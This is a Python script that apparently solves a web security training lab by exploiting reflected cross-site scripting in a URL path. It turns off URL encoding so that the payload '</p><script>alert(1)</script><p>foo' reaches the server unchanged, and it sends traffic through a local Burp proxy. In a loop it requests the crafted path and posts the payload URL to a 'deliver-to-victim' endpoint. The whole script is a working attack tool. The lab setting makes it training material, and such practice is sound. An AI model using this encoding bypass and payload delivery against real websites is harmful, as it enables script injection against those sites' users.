import requests
import sys
import urllib3
import time
from requests.adapters import HTTPAdapter
from requests.utils import urldefragauth

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning) # type: ignore
urllib3.util.url._encode_invalid_chars = lambda component, allowed_chars, encoding="utf-8": component # type: ignore

# Burp Suite proxy
proxies = {
    'http': 'http://127.0.0.1:8080',
    'https': 'http://127.0.0.1:8080',  
}

headers = {
    'Content-Type': 'application/x-www-form-urlencoded',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.132 Safari/537.36'
}

class NoEncodeAdapter(HTTPAdapter):
    def request_url(self, request, proxies):
        return urldefragauth(request.url) # type: ignore

def deliver_to_victim(s, url, path, answer):
    target_url = url + path
    payload = { 'answer': answer }
    s.post(target_url, data=payload)

def goto(s, url, path, data={}, headers={}, cookies={}):
    target_url = url + path
    req = requests.Request('GET', target_url)
    prepped = req.prepare()
    prepped.url = target_url
    s.send(prepped)

def check_solved_lab(s, url):
    r = s.get(url)
    if "Congratulations, you solved the lab!" in r.text:
        print("[+] Successful solved lab")
        sys.exit(0)

def main():
    if len(sys.argv) != 2:
        print("(+) Usage: %s <url>" % sys.argv[0])
        print("(+) Example: %s www.example.com" % sys.argv[0])
        sys.exit(-1)

    s = requests.Session()
    s.proxies = proxies
    s.verify = False
    s.mount('https://', NoEncodeAdapter())
    s.mount('http://', NoEncodeAdapter())
    url = sys.argv[1].rstrip('/')

    path = f'/</p><script>alert(1)</script><p>foo'

    while True:
        goto(s, url, path)
        deliver_to_victim(s, url, '/deliver-to-victim', f'{url}{path}')
        check_solved_lab(s, url)
        time.sleep(3)

if __name__ == '__main__':
    main()